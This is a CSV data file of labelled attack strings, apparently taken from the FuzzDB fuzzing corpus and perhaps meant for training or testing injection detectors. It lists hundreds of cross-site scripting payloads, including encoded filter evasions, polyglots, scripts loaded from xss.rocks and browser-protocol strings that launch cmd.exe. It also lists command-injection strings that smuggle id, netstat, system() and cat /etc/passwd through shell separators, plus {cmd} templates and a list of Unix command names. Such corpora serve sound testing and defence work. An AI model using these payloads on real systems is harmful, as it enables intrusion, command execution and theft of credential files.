id,payload,label
fuzzdb_2145,x”</title><img src%3dx onerror%3dalert(1)>,xss
fuzzdb_2146,[[#%3Cscript%3Ealert(1)%3C/script%3E|,xss
fuzzdb_2147,a{b:`function(){alert(1)}()`;},xss
fuzzdb_2148,"""><style type=text/less>a{b:`function(){alert(1)}()`;}</style>",xss
fuzzdb_2149,<SCRIPT>alert('XSS');</SCRIPT>,xss
fuzzdb_2150,"'';!--""<XSS>=&{()}",xss
fuzzdb_2151,<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>,xss
fuzzdb_2152,"<IMG SRC=""javascript:alert('XSS');"">",xss
fuzzdb_2153,<IMG SRC=javascript:alert('XSS')>,xss
fuzzdb_2154,<IMG SRC=JaVaScRiPt:alert('XSS')>,xss
fuzzdb_2155,<IMG SRC=javascript:alert(&quot;XSS&quot;)>,xss
fuzzdb_2156,"<IMG SRC=`javascript:alert(""RSnake says, 'XSS'"")`>",xss
fuzzdb_2157,"<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",xss
fuzzdb_2158,SRC=&#10<IMG 6;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>,xss
fuzzdb_2159,<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>,xss
fuzzdb_2160,<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>,xss
fuzzdb_2161,"<IMG SRC=""jav	ascript:alert('XSS');"">",xss
fuzzdb_2162,"<IMG SRC=""jav&#x09;ascript:alert('XSS');"">",xss
fuzzdb_2163,"<IMG SRC=""jav&#x0A;ascript:alert('XSS');"">",xss
fuzzdb_2164,"<IMG SRC=""jav&#x0D;ascript:alert('XSS');"">",xss
fuzzdb_2165,"<IMG SRC="" &#14;  javascript:alert('XSS');"">",xss
fuzzdb_2166,"<IMG%0aSRC%0a=%0a""%0aj%0aa%0av%0aa%0as%0ac%0ar%0ai%0ap%0at%0a:%0aa%0al%0ae%0ar%0at%0a(%0a'%0aX%0aS%0aS%0a'%0a)%0a""%0a>",xss
fuzzdb_2167,"<IMG SRC=java%00script:alert(\""XSS\"")>",xss
fuzzdb_2168,"<SCR%00IPT>alert(\""XSS\"")</SCR%00IPT>",xss
fuzzdb_2169,"<SCRIPT/XSS SRC=""http://xss.rocks/xss.js""></SCRIPT>",xss
fuzzdb_2170,<SCRIPT SRC=http://xss.rocks/xss.js?<B>,xss
fuzzdb_2171,"<IMG SRC=""javascript:alert('XSS')""",xss
fuzzdb_2172,<SCRIPT>a=/XSS/,xss
fuzzdb_2173,"\"";alert('XSS');//",xss
fuzzdb_2174,"<INPUT TYPE=""IMAGE"" SRC=""javascript:alert('XSS');"">",xss
fuzzdb_2175,"<BODY BACKGROUND=""javascript:alert('XSS')"">",xss
fuzzdb_2176,<BODY ONLOAD=alert('XSS')>,xss
fuzzdb_2177,"<IMG DYNSRC=""javascript:alert('XSS')"">",xss
fuzzdb_2178,"<IMG LOWSRC=""javascript:alert('XSS')"">",xss
fuzzdb_2179,"<BGSOUND SRC=""javascript:alert('XSS');"">",xss
fuzzdb_2180,"<BR SIZE=""&{alert('XSS')}"">",xss
fuzzdb_2181,"<LAYER SRC=""http://xss.rocks/scriptlet.html""></LAYER>",xss
fuzzdb_2182,"<LINK REL=""stylesheet"" HREF=""javascript:alert('XSS');"">",xss
fuzzdb_2183,"<LINK REL=""stylesheet"" HREF=""http://xss.rocks/xss.css"">",xss
fuzzdb_2184,<STYLE>@import'http://xss.rocks/xss.css';</STYLE>,xss
fuzzdb_2185,"<META HTTP-EQUIV=""Link"" Content=""<http://xss.rocks/xss.css>; REL=stylesheet"">",xss
fuzzdb_2186,"<STYLE>BODY{-moz-binding:url(""http://xss.rocks/xssmoz.xml#xss"")}</STYLE>",xss
fuzzdb_2187,"<IMG SRC='vbscript:msgbox(""XSS"")'>",xss
fuzzdb_2188,"<IMG SRC=""mocha:[code]"">",xss
fuzzdb_2189,"<IMG SRC=""livescript:[code]"">",xss
fuzzdb_2190,"<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=javascript:alert('XSS');"">",xss
fuzzdb_2191,"<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"">",xss
fuzzdb_2192,"<META HTTP-EQUIV=""Link"" Content=""<javascript:alert('XSS')>; REL=stylesheet"">",xss
fuzzdb_2193,"<META HTTP-EQUIV=""refresh"" CONTENT=""0; URL=http://;URL=javascript:alert('XSS');"">",xss
fuzzdb_2194,"<IFRAME SRC=""javascript:alert('XSS');""></IFRAME>",xss
fuzzdb_2195,"<FRAMESET><FRAME SRC=""javascript:alert('XSS');""></FRAMESET>",xss
fuzzdb_2196,"<TABLE BACKGROUND=""javascript:alert('XSS')"">",xss
fuzzdb_2197,"<DIV STYLE=""background-image: url(javascript:alert('XSS'))"">",xss
fuzzdb_2198,"<DIV STYLE=""background-image: url(&#1;javascript:alert('XSS'))"">",xss
fuzzdb_2199,"<DIV STYLE=""width: expression(alert('XSS'));"">",xss
fuzzdb_2200,"<STYLE>@im\port'\ja\vasc\ript:alert(""XSS"")';</STYLE>",xss
fuzzdb_2201,"<IMG STYLE=""xss:expr/*XSS*/ession(alert('XSS'))"">",xss
fuzzdb_2202,"<XSS STYLE=""xss:expression(alert('XSS'))"">",xss
fuzzdb_2203,"exp/*<XSS STYLE='no\xss:noxss(""*//*"");",xss
fuzzdb_2204,"<STYLE TYPE=""text/javascript"">alert('XSS');</STYLE>",xss
fuzzdb_2205,"<STYLE>.XSS{background-image:url(""javascript:alert('XSS')"");}</STYLE><A CLASS=XSS></A>",xss
fuzzdb_2206,"<STYLE type=""text/css"">BODY{background:url(""javascript:alert('XSS')"")}</STYLE>",xss
fuzzdb_2207,"<BASE HREF=""javascript:alert('XSS');//"">",xss
fuzzdb_2208,"<OBJECT TYPE=""text/x-scriptlet"" DATA=""http://xss.rocks/scriptlet.html""></OBJECT>",xss
fuzzdb_2209,<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>,xss
fuzzdb_2210,"getURL(""javascript:alert('XSS')"")",xss
fuzzdb_2211,"a=""get"";",xss
fuzzdb_2212,"<!--<value><![CDATA[<XML ID=I><X><C><![CDATA[<IMG SRC=""javas<![CDATA[cript:alert('XSS');"">",xss
fuzzdb_2213,"<XML SRC=""http:/xss.rocks/xsstest.xml"" ID=I></XML>",xss
fuzzdb_2214,<HTML><BODY>,xss
fuzzdb_2215,"<SCRIPT SRC=""http://xss.rocks/xss.jpg""></SCRIPT>",xss
fuzzdb_2216,"<!--#exec cmd=""/bin/echo '<SCRIPT SRC'""--><!--#exec cmd=""/bin/echo '=http://xss.rocks/xss.js></SCRIPT>'""-->",xss
fuzzdb_2217,<? echo('<SCR)';,xss
fuzzdb_2218,"<META HTTP-EQUIV=""Set-Cookie"" Content=""USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;"">",xss
fuzzdb_2219,"<HEAD><META HTTP-EQUIV=""CONTENT-TYPE"" CONTENT=""text/html; charset=UTF-7""> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-",xss
fuzzdb_2220,"<SCRIPT a="">"" SRC=""http://xss.rocks/xss.js""></SCRIPT>",xss
fuzzdb_2221,"<SCRIPT a="">"" '' SRC=""http://xss.rocks/xss.js""></SCRIPT>",xss
fuzzdb_2222,"<SCRIPT ""a='>'"" SRC=""http://xss.rocks/xss.js""></SCRIPT>",xss
fuzzdb_2223,"<SCRIPT a=`>` SRC=""http://xss.rocks/xss.js""></SCRIPT>",xss
fuzzdb_2224,"<SCRIPT>document.write(""<SCRI"");</SCRIPT>PT SRC=""xss.rocks/xss.js""></SCRIPT>",xss
fuzzdb_2225,"aim: &c:\windows\system32\calc.exe"" ini=""C:\Documents and Settings\All Users\Start Menu\Programs\Startup\pwnd.bat""",xss
fuzzdb_2226,"firefoxurl:test|""%20-new-window%20javascript:alert(\'Cross%2520Browser%2520Scripting!\');""",xss
fuzzdb_2227,"navigatorurl:test"" -chrome ""javascript:C=Components.classes;I=Components.interfaces;file=C[\'@mozilla.org/file/local;1\'].createInstance(I.nsILocalFile);file.initWithPath(\'C:\'+String.fromCharCode(92)+String.fromCharCode(92)+\'Windows\'+String.fromCharCode(92)+String.fromCharCode(92)+\'System32\'+String.fromCharCode(92)+String.fromCharCode(92)+\'cmd.exe\');process=C[\'@mozilla.org/process/util;1\'].createInstance(I.nsIProcess);process.init(file);process.run(true%252c{}%252c0);alert(process)",xss
fuzzdb_2228,res://c:\\program%20files\\adobe\\acrobat%207.0\\acrobat\\acrobat.dll/#2/#210,xss
fuzzdb_2229,"firefoxurl:test"" -chrome ""javascript:C=Components.classes;I=Components.interfaces;file=C['@mozilla.org/file/local;1'].createInstance(.nsILocalFile);file.initWithPath('C:'+String.fromCharCode(92)+String.fromCharCode(92)+'Windows'+String.fromCharCode(92)+String.fromCharCode(92)+'System32'+String.fromCharCode(92)+String.fromCharCode(92)+'cmd.exe');process=C['@mozilla.org/process/util;1'].createInstance(I.nsIProcess);process.init(file);process.run(true%252c{}%252c0);alert(process)",xss
fuzzdb_2230,"navigatorurl:test"" -chrome ""javascript:C=Components.classes;I=Components.interfaces;file=C['@mozilla.org/file/local;1'].createInstance(I.nsILocalFile);file.initWithPath('C:'+String.fromCharCode(92)+String.fromCharCode(92)+'Windows'+String.fromCharCode(92)+String.fromCharCode(92)+'System32'+String.fromCharCode(92)+String.fromCharCode(92)+'cmd.exe');process=C['@mozilla.org/process/util;1'].createInstance(I.nsIProcess);process.init(file);process.run(true%252c{}%252c0);alert(process)",xss
fuzzdb_2231,"jaVasCript:/*-/*`/*\`/*'/*""/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e",xss
fuzzdb_2232,"/*-/*`/*\`/*'/*""/**/",xss
fuzzdb_2233,(/* */oNcliCk=alert() ),xss
fuzzdb_2234,//%0D%0A%0D%0A//,xss
fuzzdb_2235,</stYle/</titLe/</teXtarEa/</scRipt/--!>,xss
fuzzdb_2236,\x3csVg/<sVg/oNloAd=alert()//>\x3e,xss
fuzzdb_2237,"<input type='text' value='jaVasCript:/*-/*`/*\`/*'/*""/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e'></input>",xss
fuzzdb_2238,"<input type=text value=jaVasCript:/*-/*`/*\`/*'/*""/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e></input>",xss
fuzzdb_2239,<img border=3 alt=jaVasCript:/*-/*`/*\`/*&#039;/*&quot;/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e>,xss
fuzzdb_2240,"<a href=""jaVasCript:/*-/*`/*\`/*&#039;/*&quot;/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e"">click me</a>",xss
fuzzdb_2241,"<math xlink:href=""jaVasCript:/*-/*`/*\`/*&#039;/*&quot;/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e"">click me</math>",xss
fuzzdb_2242,"<iframe src=""jaVasCript:/*-/*`/*\`/*&#039;/*&quot;/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e""></iframe>",xss
fuzzdb_2243,"<!--jaVasCript:/*-/*`/*\`/*'/*""/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e-->",xss
fuzzdb_2244,"<style>jaVasCript:/*-/*`/*\`/*'/*""/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e</style>",xss
fuzzdb_2245,"<textarea>jaVasCript:/*-/*`/*\`/*'/*""/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e</textarea>",xss
fuzzdb_2246,"<div>jaVasCript:/*-/*`/*\`/*'/*""/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e</div>",xss
fuzzdb_2247,"var str = ""jaVasCript:/*-/*`/*\`/*'/*""/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e"";",xss
fuzzdb_2248,"var str = 'jaVasCript:/*-/*`/*\`/*'/*""/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e';",xss
fuzzdb_2249,"<script>//jaVasCript:/*-/*`/*\`/*'/*""/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e</script>",xss
fuzzdb_2250,"<script>/*jaVasCript:/*-/*`/*\`/*'/*""/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e*/</script>",xss
fuzzdb_2251,"</script><script src=""https://static.jsbin.com/js/render/edit.js?3.35.11""></script><script>jsbinShowEdit && jsbinShowEdit({""static"":""https://static.jsbin.com"",""root"":""https://jsbin.com""});</script><script>",xss
fuzzdb_2252,setTimeout(location.search.slice(1));,xss
fuzzdb_2253,jaVasCript:/-/%60/%5C%60/'/%22//(/%20*/oNcliCk=alert()%20)//%250D%250A%250D%250A//%3C/stYle/%3C/titLe/%3C/teXtarEa/%3C/scRipt/--!%3E%3CsVg/%3CsVg/oNloAd=alert()//%3E%3E,xss
fuzzdb_2254,"var data = ""jaVasCript:/*-/*`/*\`/*&#039;/*&quot;/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e"";document.documentElement.innerHTML = data;",xss
fuzzdb_2255,"var data = ""jaVasCript:/*-/*`/*\`/*&#039;/*&quot;/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e"";document.head.outerHTML = data;",xss
fuzzdb_2256,"var data = ""jaVasCript:/*-/*`/*\`/*&#039;/*&quot;/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e"";document.write(data);document.close();",xss
fuzzdb_2257,"<!--#exec cmd=""/usr/bin/id""-->",cmd_injection
fuzzdb_2258,"<!--#exec cmd=""id""-->",cmd_injection
fuzzdb_2259,/index.html|id|,cmd_injection
fuzzdb_2260,;id;,cmd_injection
fuzzdb_2261,;id,cmd_injection
fuzzdb_2262,;netstat -a;,cmd_injection
fuzzdb_2263,;id;,cmd_injection
fuzzdb_2264,|id,cmd_injection
fuzzdb_2265,|/usr/bin/id,cmd_injection
fuzzdb_2266,|id|,cmd_injection
fuzzdb_2267,|/usr/bin/id|,cmd_injection
fuzzdb_2268,||/usr/bin/id|,cmd_injection
fuzzdb_2269,|id;,cmd_injection
fuzzdb_2270,||/usr/bin/id;,cmd_injection
fuzzdb_2271,;id|,cmd_injection
fuzzdb_2272,;|/usr/bin/id|,cmd_injection
fuzzdb_2273,\n/bin/ls -al\n,cmd_injection
fuzzdb_2274,\n/usr/bin/id\n,cmd_injection
fuzzdb_2275,\nid\n,cmd_injection
fuzzdb_2276,\n/usr/bin/id;,cmd_injection
fuzzdb_2277,\nid;,cmd_injection
fuzzdb_2278,\n/usr/bin/id|,cmd_injection
fuzzdb_2279,\nid|,cmd_injection
fuzzdb_2280,;/usr/bin/id\n,cmd_injection
fuzzdb_2281,;id\n,cmd_injection
fuzzdb_2282,|usr/bin/id\n,cmd_injection
fuzzdb_2283,|nid\n,cmd_injection
fuzzdb_2284,`id`,cmd_injection
fuzzdb_2285,`/usr/bin/id`,cmd_injection
fuzzdb_2286,a);id,cmd_injection
fuzzdb_2287,a;id,cmd_injection
fuzzdb_2288,a);id;,cmd_injection
fuzzdb_2289,a;id;,cmd_injection
fuzzdb_2290,a);id|,cmd_injection
fuzzdb_2291,a;id|,cmd_injection
fuzzdb_2292,a)|id,cmd_injection
fuzzdb_2293,a|id,cmd_injection
fuzzdb_2294,a)|id;,cmd_injection
fuzzdb_2295,a|id,cmd_injection
fuzzdb_2296,|/bin/ls -al,cmd_injection
fuzzdb_2297,a);/usr/bin/id,cmd_injection
fuzzdb_2298,a;/usr/bin/id,cmd_injection
fuzzdb_2299,a);/usr/bin/id;,cmd_injection
fuzzdb_2300,a;/usr/bin/id;,cmd_injection
fuzzdb_2301,a);/usr/bin/id|,cmd_injection
fuzzdb_2302,a;/usr/bin/id|,cmd_injection
fuzzdb_2303,a)|/usr/bin/id,cmd_injection
fuzzdb_2304,a|/usr/bin/id,cmd_injection
fuzzdb_2305,a)|/usr/bin/id;,cmd_injection
fuzzdb_2306,a|/usr/bin/id,cmd_injection
fuzzdb_2307,;system('cat%20/etc/passwd'),cmd_injection
fuzzdb_2308,;system('id'),cmd_injection
fuzzdb_2309,;system('/usr/bin/id'),cmd_injection
fuzzdb_2310,%0Acat%20/etc/passwd,cmd_injection
fuzzdb_2311,%0A/usr/bin/id,cmd_injection
fuzzdb_2312,%0Aid,cmd_injection
fuzzdb_2313,%0A/usr/bin/id%0A,cmd_injection
fuzzdb_2314,%0Aid%0A,cmd_injection
fuzzdb_2315,& ping -i 30 127.0.0.1 &,cmd_injection
fuzzdb_2316,& ping -n 30 127.0.0.1 &,cmd_injection
fuzzdb_2317,%0a ping -i 30 127.0.0.1 %0a,cmd_injection
fuzzdb_2318,`ping 127.0.0.1`,cmd_injection
fuzzdb_2319,| id,cmd_injection
fuzzdb_2320,& id,cmd_injection
fuzzdb_2321,; id,cmd_injection
fuzzdb_2322,%0a id %0a,cmd_injection
fuzzdb_2323,`id`,cmd_injection
fuzzdb_2324,$;/usr/bin/id,cmd_injection
fuzzdb_2325,{cmd},cmd_injection
fuzzdb_2326,;{cmd},cmd_injection
fuzzdb_2327,;{cmd};,cmd_injection
fuzzdb_2328,^{cmd},cmd_injection
fuzzdb_2329,|{cmd},cmd_injection
fuzzdb_2330,<{cmd},cmd_injection
fuzzdb_2331,<{cmd};,cmd_injection
fuzzdb_2332,<{cmd}\n,cmd_injection
fuzzdb_2333,<{cmd}%0D,cmd_injection
fuzzdb_2334,<{cmd}%0A,cmd_injection
fuzzdb_2335,&{cmd},cmd_injection
fuzzdb_2336,&{cmd}&,cmd_injection
fuzzdb_2337,&&{cmd},cmd_injection
fuzzdb_2338,&&{cmd}&&,cmd_injection
fuzzdb_2339,%0D{cmd},cmd_injection
fuzzdb_2340,%0D{cmd}%0D,cmd_injection
fuzzdb_2341,%0A{cmd},cmd_injection
fuzzdb_2342,%0A{cmd}%0A,cmd_injection
fuzzdb_2343,\n{cmd},cmd_injection
fuzzdb_2344,\n{cmd}\n,cmd_injection
fuzzdb_2345,'{cmd}',cmd_injection
fuzzdb_2346,`{cmd}`,cmd_injection
fuzzdb_2347,;{cmd}|,cmd_injection
fuzzdb_2348,;{cmd}/n,cmd_injection
fuzzdb_2349,|{cmd};,cmd_injection
fuzzdb_2350,a);{cmd},cmd_injection
fuzzdb_2351,a;{cmd},cmd_injection
fuzzdb_2352,a);{cmd},cmd_injection
fuzzdb_2353,a;{cmd};,cmd_injection
fuzzdb_2354,a);{cmd}|,cmd_injection
fuzzdb_2355,FAIL||{cmd},cmd_injection
fuzzdb_2356,CMD=$'{cmd}';$CMD,cmd_injection
fuzzdb_2357,;CMD=$'{cmd}';$CMD,cmd_injection
fuzzdb_2358,^CMD=$'{cmd}';$CMD,cmd_injection
fuzzdb_2359,|CMD=$'{cmd}';$CMD,cmd_injection
fuzzdb_2360,&CMD=$'{cmd}';$CMD,cmd_injection
fuzzdb_2361,&&CMD=$'{cmd}';$CMD,cmd_injection
fuzzdb_2362,%0DCMD=$'{cmd}';$CMD,cmd_injection
fuzzdb_2363,FAIL||CMD=$'{cmd}';$CMD,cmd_injection
fuzzdb_2364,CMD=$\'{cmd}\';$CMD,cmd_injection
fuzzdb_2365,;CMD=$\'{cmd}\';$CMD,cmd_injection
fuzzdb_2366,^CMD=$\'{cmd}\';$CMD,cmd_injection
fuzzdb_2367,|CMD=$\'{cmd}\';$CMD,cmd_injection
fuzzdb_2368,&CMD=$\'{cmd}\';$CMD,cmd_injection
fuzzdb_2369,&&CMD=$\'{cmd}\';$CMD,cmd_injection
fuzzdb_2370,%0DCMD=$\'{cmd}\';$CMD,cmd_injection
fuzzdb_2371,FAIL||CMD=$\'{cmd}\';$CMD,cmd_injection
fuzzdb_2372,"CMD=$""{cmd}"";$CMD",cmd_injection
fuzzdb_2373,";CMD=$""{cmd}"";$CMD",cmd_injection
fuzzdb_2374,"^CMD=$""{cmd}"";$CMD",cmd_injection
fuzzdb_2375,"|CMD=$""{cmd}"";$CMD",cmd_injection
fuzzdb_2376,"&CMD=$""{cmd}"";$CMD",cmd_injection
fuzzdb_2377,"&&CMD=$""{cmd}"";$CMD",cmd_injection
fuzzdb_2378,"%0DCMD=$""{cmd}"";$CMD",cmd_injection
fuzzdb_2379,"FAIL||CMD=$""{cmd}"";$CMD",cmd_injection
fuzzdb_2380,"<!--#exec cmd=""{cmd}""-->",cmd_injection
fuzzdb_2381,;system('{cmd}'),cmd_injection
fuzzdb_2382,accept,cmd_injection
fuzzdb_2383,access,cmd_injection
fuzzdb_2384,aclocal,cmd_injection
fuzzdb_2385,aconnect,cmd_injection
fuzzdb_2386,acpi,cmd_injection
fuzzdb_2387,acpi_available,cmd_injection
fuzzdb_2388,acpid,cmd_injection
fuzzdb_2389,addr2line,cmd_injection
fuzzdb_2390,addresses,cmd_injection
fuzzdb_2391,agetty,cmd_injection
fuzzdb_2392,alsactl,cmd_injection
fuzzdb_2393,amidi,cmd_injection
fuzzdb_2394,amixer,cmd_injection
fuzzdb_2395,anacron,cmd_injection
fuzzdb_2396,aplay,cmd_injection
fuzzdb_2397,aplaymidi,cmd_injection
fuzzdb_2398,apm,cmd_injection
fuzzdb_2399,apmd,cmd_injection
fuzzdb_2400,apropos,cmd_injection
fuzzdb_2401,apt,cmd_injection
fuzzdb_2402,ar,cmd_injection
fuzzdb_2403,arch,cmd_injection
fuzzdb_2404,arecord,cmd_injection
fuzzdb_2405,arecordmidi,cmd_injection
fuzzdb_2406,arp,cmd_injection
fuzzdb_2407,as,cmd_injection
fuzzdb_2408,at,cmd_injection
fuzzdb_2409,atd,cmd_injection
fuzzdb_2410,atq,cmd_injection
fuzzdb_2411,atrm,cmd_injection
fuzzdb_2412,audiosend,cmd_injection
fuzzdb_2413,aumix,cmd_injection
fuzzdb_2414,autoconf,cmd_injection
fuzzdb_2415,autoheader,cmd_injection
fuzzdb_2416,automake,cmd_injection
fuzzdb_2417,autoreconf,cmd_injection
fuzzdb_2418,autoscan,cmd_injection
fuzzdb_2419,autoupdate,cmd_injection
fuzzdb_2420,badblocks,cmd_injection
fuzzdb_2421,banner,cmd_injection
fuzzdb_2422,basename,cmd_injection
fuzzdb_2423,bash,cmd_injection
fuzzdb_2424,batch,cmd_injection
fuzzdb_2425,bc,cmd_injection
fuzzdb_2426,biff,cmd_injection
fuzzdb_2427,bison,cmd_injection
fuzzdb_2428,bzcmp,cmd_injection
fuzzdb_2429,bzdiff,cmd_injection
fuzzdb_2430,bzgrep,cmd_injection
fuzzdb_2431,bzip2,cmd_injection
fuzzdb_2432,bzless,cmd_injection
fuzzdb_2433,bzmore,cmd_injection
fuzzdb_2434,c++,cmd_injection
fuzzdb_2435,cal,cmd_injection
fuzzdb_2436,cardctl,cmd_injection
fuzzdb_2437,cardmgr,cmd_injection
fuzzdb_2438,cat,cmd_injection
fuzzdb_2439,cc,cmd_injection
fuzzdb_2440,cdda2wav,cmd_injection
fuzzdb_2441,cdparanoia,cmd_injection
fuzzdb_2442,cdrdao,cmd_injection
fuzzdb_2443,cdrecord,cmd_injection
fuzzdb_2444,cfdisk,cmd_injection
fuzzdb_2445,c++filt,cmd_injection
fuzzdb_2446,chage,cmd_injection
fuzzdb_2447,chattr,cmd_injection
fuzzdb_2448,chfn,cmd_injection
fuzzdb_2449,chgrp,cmd_injection
fuzzdb_2450,chkconfig,cmd_injection
fuzzdb_2451,chmod,cmd_injection
fuzzdb_2452,chown,cmd_injection
fuzzdb_2453,chpasswd,cmd_injection
fuzzdb_2454,chroot,cmd_injection
fuzzdb_2455,chrt,cmd_injection
fuzzdb_2456,chsh,cmd_injection
fuzzdb_2457,chvt,cmd_injection
fuzzdb_2458,cksum,cmd_injection
fuzzdb_2459,clear,cmd_injection
fuzzdb_2460,cmp,cmd_injection
fuzzdb_2461,col,cmd_injection
fuzzdb_2462,colcrt,cmd_injection
fuzzdb_2463,colrm,cmd_injection
fuzzdb_2464,column,cmd_injection
fuzzdb_2465,comm,cmd_injection
fuzzdb_2466,compress,cmd_injection
fuzzdb_2467,cp,cmd_injection
fuzzdb_2468,cpio,cmd_injection
fuzzdb_2469,cpp,cmd_injection
fuzzdb_2470,crond,cmd_injection
fuzzdb_2471,crontab,cmd_injection
fuzzdb_2472,csplit,cmd_injection
fuzzdb_2473,ctags,cmd_injection
fuzzdb_2474,cupsd,cmd_injection
fuzzdb_2475,cut,cmd_injection
fuzzdb_2476,cvs,cmd_injection
fuzzdb_2477,date,cmd_injection
fuzzdb_2478,dd,cmd_injection
fuzzdb_2479,deallocvt,cmd_injection
fuzzdb_2480,debugfs,cmd_injection
fuzzdb_2481,depmod,cmd_injection
fuzzdb_2482,devdump,cmd_injection
fuzzdb_2483,df,cmd_injection
fuzzdb_2484,diff,cmd_injection
fuzzdb_2485,diff3,cmd_injection
fuzzdb_2486,dig,cmd_injection
fuzzdb_2487,dir,cmd_injection
fuzzdb_2488,dircolors,cmd_injection
fuzzdb_2489,dirname,cmd_injection
